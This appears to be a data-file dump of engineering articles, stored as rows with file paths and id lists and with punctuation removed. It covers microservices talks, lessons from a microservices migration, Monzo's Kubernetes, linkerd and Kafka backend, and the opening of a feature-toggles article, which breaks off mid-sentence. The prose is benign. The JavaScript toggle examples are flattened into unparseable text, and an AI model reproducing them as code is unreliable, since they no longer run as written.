Model around business concepts  Adopt the culture of automation  Hide internal implementation details  Decentralize all the things  Independently deployable  Isolate failures Highly observable and Consumer first   Also I would like to recommend you watching the talk by Eric Evans on DDD   Microservices  At Last  Some Boundaries   Eric is the author of book Domain Driven Design   https   www youtube com watch v PFQnNFe27kU  The State of the Art in Microservices by Adrian Cockcroft  Adrian Cockcroft  is a pioneer in the Microservices field and a Technology Fellow at Battery Ventures  Before joining Battery  Adrian helped lead Netflix s migration to a large scale  highly available public cloud architecture and the open sourcing of the cloud native NetflixOSS platform  Once  I had the luxury of meeting him in person at the Microservices Meetup   San Jose  He did a wonderful talk on Microservices  what s Missing at that meetup  In this talk Adrian presents sort of a template for any microservices architecture  The top layer consists of Tooling  Configuration  Discovery  Routing and Observability  Then the Datastores layer is followed by Operational  Orchestration and Deployment Infrastructure layer and Deployment  Languages and Container layer  He further explains in his talk  how Netflix  Twitter  Gilt and Hailo fit into his template for microservices architecture   I would also recommend you going through two more awesome talk by Adrian  Fast Delivery  Here he presents his experience at Netflix and the lessons learnt  Speed wins in the market place  Remove friction from product development  High trust   low process   no hands off between teams  Freedom and responsibility culture  Don t do your own undifferentiated heavy lifting  Use simple patterns automated by tooling  Self service cloud makes impossible things instant  The other one is  The Evolution of Microservices   https   www youtube com watch v pwpxq9 uw_0  Faster  Cheaper and Safer  Secure Microservice Architectures using Docker by Adrian Cockcroft  Another talk by Adrian Cockcroft  This was delivered at the DockerCon June 2015  San Francisco  This talk is at very high level   highlights the importance of taking into account internal as well external threats in a microservices deployment with Docker  Unfortunately this talk does not go into details  as someone would expect by looking at the title  Here is a great resource if you want to learn more about Docker and Container security   Also I would like to recommend you watching two other talks on microservices security   even though these two are not included in this list  Securing Micro services with a Distributed Firewall by Spike Curtis and Securing Microservices by Sam Newman   There is another interesting talk on microservice security  done by Bryan Payne from Netflix  Bryan leads the Netflix platform security team  In his talk he explains how Netflix uses short lived certificates to secure microservices  We recently invited him to give a talk on it  at our Silicon Valley IAM User Group meetup   at the WSO2 Mountain View office  You can read the summary of the meetup from here   https   www youtube com watch v zDuTIZBh5_Q  Developing Applications with the Microservices Architecture by Chris Richardson  Chris Richardson is the creator of microservices io  I had the luxury of meeting him once at the Silicon Valley Java User Group  There he talked about Developing event driven microservices with event sourcing and CQRS  In this talk Chris describes the microservice architecture and how to use it to build complex applications  He explains how techniques such as Command Query Responsibility Segregation  CQRS  and Event Sourcing address the key challenges of developing applications with this architecture   https   www youtube com watch v WwrCGP96 P8  Cloud Native NetflixOSS Services on Docker by Andrew Spyker  IBM  and Sudhir Tonse  Netflix   Everyone who hear about microservices  would love to hear how Netflix does with microservices  There are many talks done by Netflix architects and developers on microservices  Netflix is hosted on AWS   and doing so they had to develop many tools to improve their developer productivity and automate the microservices deployment  Then they decide to open source everything they developed and that is how NetflixOSS was born  This talk explains how to port the NetflixOSS microservices cloud platform to work within a Docker environment  including Auto Scaling  Asgard  and Eureka services    Also I would like to recommend you going through two mores talks   even though these two are not included in this list   Microservices at Proximus  Netflix OSS and HATEOAS by Andreas Evers and Web Operations in the Era of Microservices at Netflix by Diptanu Choudhury   https   www youtube com watch v Ca7HVPNsZN4  The Seven Deadly Sins of Microservices by Daniel Bryant  Daniel Bryant is a Principal Consultant for OpenCredo  This is a great talk by Daniel  for anyone who is starting to move into the microservices world  with its hype  Here he highlights seven anti patterns in building a microservices architecture  Using the latest and greatest tech  Excessive communication protocols  All your services are belong to us  Creating a distributed monolithic  Blowing up when bad things happen  The shared single domain fallacy and Testing in the world of transience   https   www infoq com presentations 7 sins microservices  Don t Build a Distributed Monolith by Ben Christensen  Ben Christensen is a software engineer at Facebook and prior to that he worked at Netflix working on the Netflix API Platform team responsible for fault tolerance  performance  architecture and scale while enabling millions of customers to access the Netflix experience across more than 1 000 different device types  In this talk Ben explains why someone should not couple the systems with binary dependencies and his experience working with distributed systems and microservices  He further explains if this trend is followed  one would easily fall into the mistake of optimizing for the short term  which ends up in costing down the road and resulting in a distributed monolith  which really starts to remove a lot of the benefits of the microservice architecture   https   www youtube com watch v  czp0Y4Z36Y  Microservices  Evolving Architecture Patterns in the Cloud by Adrian Trenaman  Gilt is a billion dollar e commerce company  implemented a sophisticated microservices architecture on AWS to handle millions of customers visiting their site  In this talk  Adrian Trenaman from Gilt explains their experiences and lessons learned during the evolution from a single monolithic Rails application in a traditional data center to more than 300 Scala Java microservices deployed in the cloud   Also I would like to recommend you to go through two mores talks   even though these two are not included in this list   Nike s Journey into Microservices by Jason Robey and Microservices   Spotify by Kevin Goldsmith   https   www youtube com watch v C4c0pkY4NgQ  Building Applications with Microservices  Docker and Nginx  As you read on Microservices and Docker  you will realize   Microservices and Docker are like a match made in heaven  This webinar by Nginx  explains how to approach application development with microservices   with Rick Nelson  Lead Solutions Architect at NGINX and J r me Petazzoni  Senior Engineer at Docker,"[60 773 548 1126 278 234 1377 1159 695 87 1405]"
61,training-dataset/engineering/88.txt,engineering,10 Lessons in MicroservicesDownload Slides  Introduction  Microservices is a software architecture style where you compose complex applications through small  independent processes  Almost all major conferences around the world have a separate dedicated track for microservices  even at language specific conferences  They have been gaining further momentum in recent years   Companies using microservices include Pinterest  Twitter  Halo  and Uber  These companies have been around for a decade maximum  staffed with young engineers  They don t have much legacy to carry around   The magic of microservices is in quick deployments  you can release something to production and adapt to feedback as quickly as possible  You can scale services up and down however you like  based on your user consumption  This makes it very easy to enhance or add features   Age old systems  I worked in a place as a consultant where we were in an environment which had Microsoft servers behind the architecture  We knew was that the customers were seeing patterns  they saw new startups come in to their own space  their own publication domain  and the startups were able to quickly add features  These were features that our client had been trying to add for years  They were in a position to be market pioneers  but they saw their user base being corroded away by tons of new startups in their space  They wanted to change the way they worked Ultimately  the interface to their end users is software delivery   My team was dealing with a 20 year old system written in C  and the team did not have a business analyst at the beginning  We were only given a part of the codebase  We were told   This is the thing  You do not have any business unless you re engineer code   They didn t know how things worked  but they wanted it to be exactly the same so as to not lose any user base because of changing features   With any business critical application  you always have tight deadlines  When we saw how people were tackling problems like these  we saw microservices as the future  this great world that answered every problem we were having  We wanted to release quickly and gauge customer feedback  When we looked at microservices  we felt like it was the future   However  it also seemed like a utopian mystery  like an imagined place where everyone exactly knows what they are supposed to do  When I was given this project and I was looking at microservices  that is exactly how I felt  all of that would be great  but it s normally used by companies that are only 10 years old and know their software well   Still  we decided that we needed to start delivering  so we tried microservices in our application  Before microservices  we imagined our monolithic application as a beautiful  multi tiered cake  which we all had to delicately balance  When we changed to microservices  we had the same tiers of architecture  but as smaller  bite size cupcakes   Lesson 1  Keep It Small  This is the  micro  in microservices  It is important to have small services so that you can rewrite the entire service if you want  You can measure the size of your service by answering this question  how long does it take to rewrite your entire service  The ideal answer for that should be in the order of two weeks   You want the service to have the ability to be rewritten  You could work on a story  and you should be able to deploy it quickly to production  When you pull a story from analysis and get it ready for dev  you want a smooth ride  If you are working with a service that is massive  it s not going to be a pleasant experience to take a story  do the development  push it into test  and then wait because some other story has a dependency on the one that you are working on  You will run into problems   If you have a service that is small enough  with only one responsibility  then it is very simple for you to be able to make changes to that service and deploy it quickly  Remember  one of the important things we had in our application was that it took months to see any changes deployed to production  This was what we wanted to avoid by keeping our services small   You have smaller codebases  which leads to small context to change  which means that it helps you do autonomous delivery  Small is not beautiful  it is practical   Lesson 2  Focus on Autonomy from Design to Deployment  Autonomy is the right of self governance  In a microservices environment  you want to be able to push a button and deploy automatically  You shouldn t have to do any choreography at all  or talk to other services   If your service is small enough  it would have dependencies it needs to make its work happen  We accepted that there will always be dependencies  That was a important turning point for us  you are not supposed to do choreography at all  But how do you deal with the dependencies   We made a conscious decision to think about what our deployment strategy would be at the beginning of the story development  We identified which services our story would touch  then when the development was done  you add the services there   Lesson 3  Plan for Contingency Measures  a k a  Breaking Changes  How do we ensure that the end user is not going to be affected when these breaking changes are deployed  and how do you avoid breaking changes   We used semantic versioning  We ensured that we had a tolerant reader in our APIs  Sometimes we would do lock step deployments  We extensively used feature toggle  based on the environment that a given story was in   While a story is in development  it will be feature toggled on dev environment  but the QA  staging  and production environment would be toggled off  Even when the RPMs reached those environments  until we are able to test and all those necessary checks are done  they are not available to the end user  When you have feature toggles  and when you ensure that you have semantic versioning tolerant readers and other things  you can try and avoid breaking changes and can at least plan for contingency measures   We did have breaking changes  but we would divide a story into sensible pods  and then say   it is going to be blocked  so do not deploy this until the other story is ready   The developers can continue with their development  and the testers can continue  When these two things are ready  then you can turn the feature on  When we were able to plan for it at the start of development  it made sense to us   It s important to be aware of having a heterogeneous architecture  When you work with old systems  you have to be really careful  As a consultant  I have the responsibility to ensure that I am not choosing tools that my customers are not able to maintain  In our case  we chose things that we knew would add long term benefits to customers  They were done in simple languages rather than ML Clojure   Lesson 4  Pay Attention to Bounded Context  Bounded context because it is such an important thing to consider  and a very easy thing to miss   In any application  you have multiple contexts  and these multiple contexts can have models which are named exactly the same  For example  in a support context  you have a  customer   and you also have a  customer  in a sales context  but the operations that that person has are completely different  People sometimes misinterpret this and they try to share operations and models between these two contexts  Please do not do that   As an example  imagine we have two services  an authentication service and the web app  When the web app is trying to authenticate  the authentication service returns a JSON response with the username and some user details  i e  age   The web app needed a response  this did not need the auth token  If I were to impart this inside the authentication service  then it would mean that the authentication service would have to return this response  Anytime the web app had to change  we had to change what the authentication service was returning  which was a big mistake on our part   What we should have done instead was make a transformation inside the web app and turned off the authentication service  Authentication service should always return one response  then consumers interpret it in different ways based on what they want   Lesson 5  Choose What Works for You and Document Your Reasons  I am a software developer  and the last thing that I want to do is write pages and pages of documentation  But it was very important for us to do this step   Developers like to improve the system they are working on  which meant that we were having the same conversations over and over again about things should be a certain way  People were getting tired of explaining again and again and trying to see what was happening   When we make a decision  understand the context why a certain decision was taken and put it up somewhere  so that it is communicated to the entire team  Then  re evaluate it anytime one of those contexts changes  That way  instead of having the same discussion over and over again  you can have the discussion where it matters   An example was understanding where our constraints and principles came from  We decided that we would do validations at every service level  which meant the validations were duplicated  but we were fine  We had good reasons why the validations should be duplicated  The important thing was around constraints  There are certain things which you cannot change in your project constraint  For instance  I was working on a Java application  and we had Python scripts  When we came to use a journey test  we started with Ruby  At that point  our clients went   No  We cannot do one more language into the port  Can you please pick up something else  either Python or Java to do this   After doing the user journey test in Ruby  we decided to change the user journey test using Java because Cucumber had a Java API as well  It made sense at that point why we had to do it  it was from a constraint which we had no control over  and there is no point in discussing over and over again whether Ruby or Java is better when your clients says to choose Java   Duplicate validations  For principles  we decided that it is okay to duplicate validations  We are always taught to not repeat ourselves  but then there are certain duplications which you should be doing   An example of this is validations where you have your client side validations in JavaScript when a user is entering something  and you match an email and you say   this is not a valid email address   That is something you would do in JavaScript  Whereas  when you are trying to save something in your database  that is a completely different validation you should be doing  which is   does it have any SQL injection in it  Does it have Bobby Tables   These validations serve two different purposes  client side vs  server side  It is a good thing to ensure that you do validations whenever necessary  In some cases  we needed to check this over and over again by duplicating validations   Shared libraries or shared clients   In our case  we decided to do both  One of the services that I was taking care of published a client for any of its consumers to connect to the service  The client had all the validations that the service would do  If you were to use the client  then you can ensure that all the validations are done  There were times where you do not want to use shared client  but you want to use instead a shared library   An example where we use a shared library  which is a very good layer of abstraction  was managing negative TTL caching  We used ELBs  When your ELB switch is being made  your service endpoint switch is being made  at that point there are times where your negative TTL caching affects the service discovery  When we had to abstract that  that was a very important thing for all the services to have it done the same  It was no reason for it to be done in two different ways  That was a very good example for us to do something in a shared library   An example of abstracting something that we should not have is abstracting models into shared libraries  We saw that the support context and sales context had customer and product shared  Someone thought  I know what to do here  we are doing the validations again and again  Let s do the smart thing  let s extract that into a separate library and then ensure that those domain models are shared between those things   It removed this boundary completely  It was a mess  We could not add any features to one context without affecting the other  which is why we wanted the microservices in the first place  What is the point of keeping it small when you share libraries in between  You might as well have both of them together  which was a costly lesson for us   Lesson 6  Embrace Conway s Law  Conway s Law is that your solution is going to mirror what your organization structure is  Instead of fighting Conway s Law  it is useful to embrace it  Make it work for you   Initially  we had a UI team  which is why we have a web app service  Then we had a platform team  We had one AWS deployment architecture  Then we had feature teams  which meant we have features in between  Any time you had to add a feature  it would touch both the UI team and the feature team and the platform team  You had to somehow coordinate giving or splitting work and deployment across these three different teams  it was a mess   As a developer  the last thing you want is to sit in meetings about how you should develop code  We decided to make our feature teams have UI developers  have a platform person  and importantly  have a product owner within  When we had a product owner team  decision making was difficult  We had to wait to get business owner approval   You want to have vertical slicing of teams instead of horizontal slicing  We used Conway s Law to our benefit to have self contained systems  The project owner is the the product owner  and they give us the requirements   Lesson 7  Take Monitoring Seriously  I cannot stress how important it is to ensure that you monitor your systems  Things can go wrong easily  When you have one thing to take care of  you have to sit and stare at that one thing  Whereas  if you have hundreds of things to take care of  you would go mental  It is important to take your monitoring seriously and ensure that you have alerts   A region going down is an important thing  but an instance going down may be not that important  You need to understand at which levels you have alerts  We had our dashboards configured for three important metrics  business  application  and system   Business metrics was a huge win for us to gain our product owner s confidence  He could see anything that he was adding  how quick it reaches production  and how it affects the user s interaction with the system  We showed whether downloads increased or decreased after a certain feature was added  those are the metrics they like to see  Those are the metrics you should track as well  as a developer on your team  to understand how the software that you put out there is interacting with the users   We used whichever tools suited our needs  and we worked on our dashboards continuously  Hystrix is a great library that has circuit breakers  If any of your dependent services are not working  we decided that we will show the content to the user anyway  because the user should not be penalized for our problem of not being able to put software out there properly  That was an example of a very good callback we had in our system   Hystrix also gives out metrics for you  We tracked callbacks in our application  and we saw that certain services were alert  which means that something went wrong at that point and something happened  but the user had the content anyway   Lesson 8  Testing  Do It  This should not be a point of contention in this century  It is important that we do testing at different levels   I was working in a system where our product owners were not used to change at a rapid pace  It scared them that they could potentially release software and lose customers  We decided we would have a QA environment which mirrors exactly what the production does  and run a soak test where we have always a user interaction with the QA environment  Anytime we were finished with a story  we would check whether the QA environment was free  and we would release it in QA  Because the soak test was running continuously  it was giving us feedback if anything were to go wrong   That covered 80  of our cases when things could go wrong  The product owners seem to come around after it  When he saw that things went wrong in QA  developers are working to fix it  Once QA testing is done  we would talk about it in the stand up  It was a great feeling for us to be able to do that   It s like Schrodinger s cat  They say that you never know whether the cat is dead or alive when it is in a box  The moment you open it is when you see it is dead or alive  But actually  you can test it  if you shake the box and the cat shouts  then it is probably alive  That is how we tested in our QA environment   We had other measures that we added apart from testing   Chaos Monkey is important if you are working in a microservice environment  Even if Chaos Monkey is not automated in your test set  try doing it as an exercise for the week and see what happens  Chaos Monkey will take care of bringing down systems  and you can track whether your infrastructure is resilient enough to handle chaos   One no brainer was to add health checks  The health check would not only check whether the web app is up and running  but if it is able to accept a request  It would also check whether it can talk to the authentication service that it was dependent on  or other five other services   We tied the health checks of a service to be also tied to the health checks of its dependent services  That was a very easy win for us when we broke any contracts between those two services  If we deploy something in QA  then we know that the health checks of the dependent services go down and there is something wrong  By doing that  it gave us resources on how we are doing things wrong  and all we had to do was quickly go fix one by one   It is important for you to ensure that your service by itself is working  and then your service with its ecosystem is working  and then services for your user are working  It is very important for you to think about in your testing strategy   Note that tests are there to validate constraints  They should not be constraints themselves   Lesson 9  Invest in Infrastructure  When we started our application between infrastructure and feature  we had 100  infrastructure stories  and then it started going down  We started getting feature stories at the beginning  because some infrastructure work had already been done  Then for the third service  as we went by we saw that the amount of infrastructure code that needs to be done was reducing  It can be daunting when you start with infrastructure  but perseverance is key   Lesson 10  Embrace New Technology  It is an evolving ecosystem out there  and you are losing out if you are not tapping on to that potential  Digital disruption has already happened  Blockbuster used to be a big thing  and now my MacBook doesn t have a DVD slot  If you are not embracing new technology  you are going to be phased out sooner rather than later   It is important for old companies to understand this and not fight it  It won t work out for long  Every environment  including banking  technology  and other services  is working on this space  and you need to tap into that potential to make things happen for you   The three factors that people say contribute to your personal growth are autonomy  mastery  and purpose  I think your microservices also need to have those three things in order for them to work properly  Ensure that it has proper autonomy and it knows what it is doing  It must have the right tools to do and  and have a purpose to exist   Microservices help you to improve on iterations  It is important in agile software development to improve iteratively and adapt to feedback  Having autonomy and taking control of business as well as technology in smaller teams helps you to deliver software quickly  You have to ensure that there is high cohesion between your services  but that they are coupled loosely enough such that you can alter its state whenever you need  You need to be able to embrace Conway s Law  If your team is not structured to do that  then that is definitely going to get into the way of you adopting microservices properly   In the end  do microservices because they re fun  It gives me great purpose as a developer when I work on something and don t have to wait six months to be released to the user  I deserve bragging rights on the things that I worked on,"[61 1351 778 773 234 520 935 92 794 695 548]"
85,training-dataset/product/629.txt,product,26 Product Launch Strategies26 topline marketing strategies to launch a new brand  product or service  Includes a 1 page summary outlining the pros and cons of each approach as well as best in class examples  Designed as flashcards so that it can be printed out to help stimulate brainstorm sessions,"[85 298 737 1351 1095 606 941 1323 1101 875 843]"
87,training-dataset/engineering/276.txt,engineering,All About Microservices   a16z   OvercastPermalink   Share link   August 31  2016   Incremental change may be good theory  but in practice you have to have a big enough stick to hit everybody with to make everything move at once   So shares Adrian Cockcroft  who helped lead Netflix s migration from datacenter to the cloud   and from monolithic to microservices architecture   when their streaming business  the  stick    was exploding  So how did they   and how can other companies   make such big  bet the company kind of moves  without getting mired in fanatical internal debates  Does organizational structure need to change  especially if moving from a more product   than project based  approach  What happens to security  And finally  what happens to the role of CIOs  what can should they do  Most interestingly  How will the entire industry be affected as companies not only adopt  but essentially offer  microservices or narrow cloud APIs  How do the trends of microservices  containers  devops  cloud  as a service  on demand  serverless   all moves towards more and more ephemerality   change,"[87 60 773 935 1126 695 234 548 278 1377 1159]"
90,training-dataset/engineering/1141.txt,engineering,From Rails to PhoenixIf you are interested in learning more about how your organization can transition from Rails to Phoenix please contact the Elixir Phoenix experts at DockYard   http   dockyard com,"[90 1335 26 257 214 607 316 112 134 582 899]"
92,training-dataset/engineering/706.txt,engineering,Monzo   Building a Modern Bank BackendAt Monzo  we re building a banking system from scratch  Our systems must be available 24x7 no matter what happens  scalable to hundreds of millions of customers around the world  and very extensible  This first post in a series about our platform explains how we re building systems to meet these demands using modern  open source technology      Since this post was published  Oliver gave a talk about many of these concepts at KubeCon 2016   From the start  we ve built our backend as a collection of distributed microservices  For an early stage startup  this architecture is quite unusual  most companies start with a centralised application using well known frameworks and relational databases   But with an ambition to build the best current account in the world and scale it to hundreds of millions of customers  we knew that we had to be the bank with the best technology  Daily batch processes  single points of failure  and maintenance windows are not acceptable in a world where customers expect 24x7  always on access to their money  and where we want to roll out new features in a matter of hours  not months   Large internet companies like Amazon  Netflix  and Twitter have shown that single monolithic codebases do not scale to large numbers of users  and crucially large numbers of developers  It follows that if we want to operate in many markets  each with unique requirements  we will someday need many teams  each working on different areas of the product  These teams need to control their own development  deployment  and scale   without having to co ordinate their changes with other teams  In short  the development process needs to be distributed and decoupled  just like our software   With only 3 backend developers at the start  we had to be pragmatic  We chose some familiar technologies which took us in the right direction and got on with building a product  knowing  future us  could always change things later   We held a workshop to plot some improvements to our platform   When we launched the Monzo beta  our backend had grown to nearly 100 services  now about 150   and our engineering team had grown considerably too  We knew our banking licence was imminent  and it felt like a good time to reconsider some of the architectural choices we d made  We held an engineering workshop and identified a few areas of focus   Cluster management  We need an efficient  automated way to manage large numbers of servers  distribute work efficiently among them  and react to machine failure  Polyglot services  Go is well suited for building microservices and will probably remain the dominant language at Monzo  but using it exclusively means we can t take advantage of tools written in other languages  RPC transport  With large numbers of services distributed across hosts  data centres  and even continents  the success of our system depends on having a solid RPC layer that can route around component failure  minimise latency  and help us understand its runtime behaviour  This layer has to make our system stronger than its weakest link  Asynchronous messaging  To make our backend performant and resilient  we use message queues to enqueue work to happen  in the background   These queues have to provide strong guarantees that work can always be enqueued and dequeued  and messages will never be lost   Cluster management  If we want to build a fault tolerant  elastically scalable system  it follows that we need the ability to add and remove servers as hardware fails  and as user demand changes  Running only a single service per host is wasteful  the service may not need all the resources of the host   and the traditional approach of manually partitioning services among hosts is tedious and difficult to scale   Cluster schedulers are designed to abstract applications away from the hardware on which they run  They use algorithms to schedule applications onto hosts according to their resource requirements  scale them up and down  and replace them when they fail  It s our ultimate goal to run our entire system on a scheduler  which means we want to deploy stateful as well as stateless apps in this way   Containerisation   and Docker in particular   is hard to ignore these days  Behind the hype  they are simply a combination of technologies in the Linux kernel coupled with an image format  but they provide a powerful abstraction  By packaging an application and all its dependencies into a single  standardised image  the application is decoupled from the operating system  and isolated from other applications on the same host  A cluster manager that deals exclusively with containers makes a lot of sense   After a year or so of using Mesos and Marathon  we decided to switch to Kubernetes  which we run on a fleet of CoreOS machines  It is very tightly integrated with Docker  and is the product of Google s long experience running containers in production at global scale  Deploying Kubernetes in a highly available configuration on AWS is not for the faint of heart and requires you to get familiar with its internals  but we are very pleased with the results  We regularly kill hosts in production and Kubernetes quickly reschedules applications to accommodate  In fact  we may soon deploy something like Netflix s Simian Army to deliberately induce failure and ensure our systems tolerate it transparently   Our production infrastructure costs about a quarter of what it did before we switched to Kubernetes  In addition to improving our resilience  Kubernetes has given us impressive cost savings  Our production infrastructure costs about a quarter of what it did before we switched to Kubernetes  To illustrate one example why  consider our build systems  Previously  we ran several very beefy Jenkins hosts dedicated to the task  which were inefficient and expensive  Now  build jobs run under Kubernetes  using spare capacity in our existing infrastructure  which is basically free  Resource allocations and limits ensure that resource intensive but low priority jobs like these do not affect the performance of critical  user facing services   Polyglot services  Go makes it easy to build low latency  high concurrency servers  but no one language ecosystem has everything we need to build a bank  We need to be able to use a wide range open source and commercial tools  hire developers with diverse skill sets  and evolve as technologies change   Docker allows us to easily package and deploy applications regardless of what language they are written in or what dependencies they have  Common practice advocates abstracting shared code into libraries  but in a polyglot system  this doesn t work  If we have to replicate and maintain thousands or even hundreds of thousands of lines of shared code each time we use a new language  this overhead quickly becomes unmanageable   Instead  we encapsulate shared code into services in their own right  To obtain a distributed lock  a service can call a locking service which fronts etcd via  vanilla  RPC  We re considering building services like these to front all  shared infrastructure   including databases and message queues  so we can reduce the required code for each language to just the client needed to perform RPC calls  This approach has already allowed us to build services in Java  Python  and Scala   By making RPC the one common component  we can still get the benefits of code reuse without the drawbacks of tight coupling from code sharing  It actually becomes much easier to build tools which apply quotas  rate limiting  and access controls   RPC  Given we want to be able to write services in many languages  whatever protocol we chose had to have good support in lots of languages  HTTP was the clear winner here  every language out there has an implementation in its standard library   However  there is still a bunch of additional functionality you need in the RPC layer to build a robust microservices platform  To mention some of the more interesting ones   Load balancing  most HTTP client libraries can perform round robin load balancing based on DNS  but this is quite a blunt instrument  Ideally  a load balancer will select the most appropriate host to minimise failure and latency   that is  even in the presence of failure and slow replicas  the system will remain up and fast   Automatic retries  in a distributed system  failure is inevitable  If a downstream service fails to process an idempotent request  it can be safely retried to a different replica  ensuring the system as a whole is resilient even in the presence of failing components   Connection pooling  opening a new connection for each request has a hugely negative impact on latency  Ideally  requests would be multiplexed onto pre existing connections   Routing  it is very powerful to be able to change the runtime behaviour of the RPC system  For example  when we deploy a new version of a service  we might want to send a fraction of overall traffic to it to check that it behaves as we expect before ramping it up to 100   This routing mechanism can also be used for internal testing  instead of having an entirely separate staging system  it becomes possible to stage individual services in production for certain users   Looking around  Finagle was clearly the most sophisticated RPC system  It has all the functionality we want and more  and it has a very clean  modular architecture  Having been in production use at Twitter for several years  it has been put through its paces in one of the world s largest microservices deployments  As luck would have it  linkerd   an out of process proxy built on Finagle   was released earlier this year  meaning we could take advantage of all of these features without having to write our applications on the JVM   Instead of talking directly to other servers  our services talk to a local copy of linkerd  which then routes the request to a downstream node chosen using a Power of Two Choices   Peak EWMA load balancer  When idempotent requests fail  they are automatically retried  within a budget   None of this complex logic has to be contained within individual services  meaning we re free to write our services in any language without having to maintain many RPC libraries   We deploy linkerd as a daemon set in Kubernetes  so services always talk to a linkerd on localhost   which forwards the request  In some cases  an RPC will never actually traverse the network if replicas of both communicating services exist on a host  As we have rolled out linkerd we ve found and contributed fixes for a few bugs in the Kubernetes integration   Asynchronous messaging  Much of the work in our backend is asynchronous  For example  even though end to end payment processing takes less than a second  we want to respond to payment networks within tens of milliseconds to  approve  or  decline  a transaction on a Monzo card  The work of enriching merchant data  sending push notifications  and even inserting the transaction into the user s feed happens asynchronously   Despite this asynchronicity  these steps are very important and must never be skipped  Even if an error happens which can t be automatically recovered  it must be possible for us to fix the issue and resume the process  This gave us several requirements for our async architecture   Highly available  publishers must be able to  fire and forget  messages to the queue  regardless of failed nodes or the state of downstream message consumers   Scalable  we must be able to add capacity to the message queue without interrupting the service and without upgrading hardware   the message queue must itself be horizontally scalable  just like the rest of our services   Persistent  if a node of the message queue fails  we must not lose data  Similarly  if a message consumer fails  it should be possible to redeliver the message and try again   Playback  it is very useful to be able to replay the message stream from a point in history  so that new processes can be run  and re run  on older data   At least once delivery  all messages must be delivered to their consumers  and although it s generally impossible to deliver a message exactly once  the  normal  mode of operation should not be that messages will be delivered many times   With all the other message queues out there  Kafka seemed like a natural fit for these requirements  Its architecture is very unusual for a message queue   it is actually a replicated commit log  but this makes it a good fit for our use case  Its replicated  partitioned design means it can tolerate node failure and scale up and down without service interruption  Its consumer design is also interesting  where most systems maintain message queues for each consumer  Kafka consumers are simply  cursors  into the message log  This makes pub sub systems much less expensive  and because messages are kept around for a while no matter what  we can play earlier events back to certain services easily   I hope this post gave you a taste for how we think about backend architecture  I ve barely scratched the surface of our platform and there s lots more to write about in future posts   for example how we store data  how we manage infrastructure security  and how we mix cloud and physical hardware when we need to connect to things like payment providers over leased lines   In the meantime  bring on some questions and comments  And if these systems sound like something you d like to nerd out on  maybe you should consider joining the team,"[92 1351 778 673 1347 358 278 830 61 1403 1309]"
99,training-dataset/engineering/1062.txt,engineering,Feature Toggles Feature Toggling  is a set of patterns which can help a team to deliver new functionality to users rapidly but safely  In this article on Feature Toggling we ll start off with a short story showing some typical scenarios where Feature Toggles are helpful  Then we ll dig into the details  covering specific patterns and practices which will help a team succeed with Feature Toggles   A Toggling Tale  Picture the scene  You re on one of several teams working on a sophisticated town planning simulation game  Your team is responsible for the core simulation engine  You have been tasked with increasing the efficiency of the Spline Reticulation algorithm  You know this will require a fairly large overhaul of the implementation which will take several weeks  Meanwhile other members of your team will need to continue some ongoing work on related areas of the codebase   You want to avoid branching for this work if at all possible  based on previous painful experiences of merging long lived branches in the past  Instead  you decide that the entire team will continue to work on trunk  but the developers working on the Spline Reticulation improvements will use a Feature Toggle to prevent their work from impacting the rest of the team or destabilizing the codebase   The birth of a Feature Toggle Here s the first change introduced by the pair working on the algorithm  before function reticulateSplines       current implementation lives here   these examples all use JavaScript ES2015 after function reticulateSplines    var useNewAlgorithm   false     useNewAlgorithm   true     UNCOMMENT IF YOU ARE WORKING ON THE NEW SR ALGORITHM if  useNewAlgorithm    return enhancedSplineReticulation     else  return oldFashionedSplineReticulation        function oldFashionedSplineReticulation       current implementation lives here   function enhancedSplineReticulation       TODO  implement better SR algorithm   The pair have moved the current algorithm implementation into an oldFashionedSplineReticulation function  and turned reticulateSplines into a Toggle Point  Now if someone is working on the new algorithm they can enable the  use new Algorithm  Feature by uncommenting the useNewAlgorithm   true line   Making a toggle dynamic A few hours pass and the pair are ready to run their new algorithm through some of the simulation engine s integration tests  They also want to exercise the old algorithm in the same integration test run  They ll need to be able to enable or disable the Feature dynamically  which means it s time to move on from the clunky mechanism of commenting or uncommenting that useNewAlgorithm   true line  function reticulateSplines    if  featureIsEnabled  use new SR algorithm      return enhancedSplineReticulation     else  return oldFashionedSplineReticulation        We ve now introduced a featureIsEnabled function  a Toggle Router which can be used to dynamically control which codepath is live  There are many ways to implement a Toggle Router  varying from a simple in memory store to a highly sophisticated distributed system with a fancy UI  For now we ll start with a very simple system  function createToggleRouter featureConfig   return   setFeature featureName isEnabled   featureConfig featureName    isEnabled     featureIsEnabled featureName   return featureConfig featureName          note that we re using ES2015 s method shorthand We can create a new toggle router based on some default configuration   perhaps read in from a config file   but we can also dynamically toggle a feature on or off  This allows automated tests to verify both sides of a toggled feature  describe   spline reticulation   function    let toggleRouter  let simulationEngine  beforeEach function    toggleRouter   createToggleRouter    simulationEngine   createSimulationEngine  toggleRouter toggleRouter        it  works correctly with old algorithm   function       Given toggleRouter setFeature  use new SR algorithm  false      When const result   simulationEngine doSomethingWhichInvolvesSplineReticulation       Then verifySplineReticulation result       it  works correctly with new algorithm   function       Given toggleRouter setFeature  use new SR algorithm  true      When const result   simulationEngine doSomethingWhichInvolvesSplineReticulation       Then verifySplineReticulation result            Getting ready to release More time passes and the team believe their new algorithm is feature complete  To confirm this they have been modifying their higher level automated tests so that they exercise the system both with the feature off and with it on  The team also wants to do some manual exploratory testing to ensure everything works as expected   Spline Reticulation is a critical part of the system s behavior  after all  To perform manual testing of a feature which hasn t yet been verified as ready for general use we need to be able to have the feature Off for our general user base in production but be able to turn it On for internal users  There are a lot of different approaches to achieve this goal  Have the Toggle Router make decisions based on a Toggle Configuration   and make that configuration environment specific  Only turn the new feature on in a pre production environment     and make that configuration environment specific  Only turn the new feature on in a pre production environment  Allow Toggle Configuration to be modified at runtime via some form of admin UI  Use that admin UI to turn the new feature on a test environment   Teach the Toggle Router how to make dynamic  per request toggling decisions  These decisions take Toggle Context into account  for example by looking for a special cookie or HTTP header  Usually Toggle Context is used as a proxy for identifying the user making the request   We ll be digging into these approaches in more detail later on  so don t worry if some of these concepts are new to you   The team decides to go with a per request Toggle Router since it gives them a lot of flexibility  The team particularly appreciate that this will allow them to test their new algorithm without needing a separate testing environment  Instead they can simply turn the algorithm on in their production environment but only for internal users  as detected via a special cookie   The team can now turn that cookie on for themselves and verify that the new feature performs as expected   Canary releasing The new Spline Reticulation algorithm is looking good based on the exploratory testing done so far  However since it s such a critical part of the game s simulation engine there remains some reluctance to turn this feature on for all users  The team decide to use their Feature Toggle infrastructure to perform a Canary Release  only turning the new feature on for a small percentage of their total userbase   a  canary  cohort  The team enhance the Toggle Router by teaching it the concept of user 